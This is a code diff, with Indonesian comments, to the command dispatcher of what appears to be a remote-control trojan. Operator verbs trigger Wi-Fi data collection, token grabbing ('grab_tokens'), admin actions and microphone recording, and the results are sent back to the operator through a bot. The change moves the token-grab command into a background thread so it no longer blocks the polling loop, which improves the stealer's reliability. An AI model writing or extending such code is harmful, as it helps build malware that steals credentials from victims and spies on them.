@@ -139,7 +139,7 @@ class Dispatcher:
         if verb == "wifi":
             return self.bot.send(extra.wifi())
         if verb == "grab":
-            return self.bot.send(extra.grab_tokens())
+            return self._slow(extra.grab_tokens)
         if verb == "power":
             return self.bot.send(extra.power(arg))
         if verb == "admin":
@@ -169,6 +169,21 @@ class Dispatcher:
             time.sleep(1)
             os._exit(0)
         return self.bot.send("[err] verb tidak dikenal: %s" % (verb or "?"))
+
+    def _slow(self, fn, *args):
+        """Perintah yang bisa makan belasan detik, jalankan di thread sendiri.
+
+        Tanpa ini, satu `grab` menahan loop polling dan perintah lain ikut
+        ngantre di belakangnya.
+        """
+        def run():
+            try:
+                self.bot.send(fn(*args))
+            except Exception as exc:
+                self.bot.send("[err] %s: %s" % (fn.__name__, exc))
+
+        threading.Thread(target=run, daemon=True).start()
+        return self.bot.send("jalan...")
 
     def _mic(self, arg):
         """Rekaman blocking, jadi thread sendiri. Hasil selalu dilaporkan."""
